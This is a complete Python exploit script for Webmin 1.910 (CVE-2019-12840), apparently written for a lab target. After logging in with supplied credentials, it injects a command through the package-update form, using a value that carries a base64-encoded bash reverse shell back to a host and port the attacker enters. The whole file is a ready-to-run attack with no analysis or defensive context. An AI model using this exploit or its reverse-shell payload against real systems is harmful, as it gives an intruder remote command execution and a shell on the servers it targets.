#!/usr/bin/python3
import requests
import urllib3
import base64
#This is an Authenticated exploit for webmin 1.910 --> CVE:2019-12840 
#Provide the root url for example http://<ip>:port
urllib3.disable_warnings()
target=input('Target_URl: ')
sid=input('sid: ')
user=input('Username: ')
password=input('Password: ')
localip=input('Local_ip: ')
localport=input('Local_port: ')
s= requests.session()
data = f'page=&user={user}&pass={password}'
print ("\033[94m[*]\033[0mAttempting to login...")
login = s.post(target+'/session_login.cgi',data=data,verify=False,proxies={'https':'http://127.0.0.1:8080'})
if login.status_code == 200 :
	print("\033[94m[*]\033[0mExecuting Code")
	cookie={'sid':f'{sid}'}
	payload= f"bash -c 'bash -i >& /dev/tcp/{localip}/{localport} 0>&1'".encode("utf-8")
	payload= base64.b64encode(payload).decode("utf-8")
	data= [('u', 'acl/apt'), ('u', f' | bash -c "echo {payload} | base64 -d | bash -i"'), ('ok_top', 'Update Selected Packages')]
	exploit = s.post(target+'/package-updates/update.cgi',cookies=cookie,data=data,headers={'Content-Type':'application/x-www-form-urlencoded','Referer':'https://10.10.10.160:10000/sysinfo.cgi?xnavigation=1'},verify=False)
	if exploit.status_code != 200:
		print ("[+]Failed..")
	else :
		print("\033[94m[*]\033[0mDone! --> check your netcat")
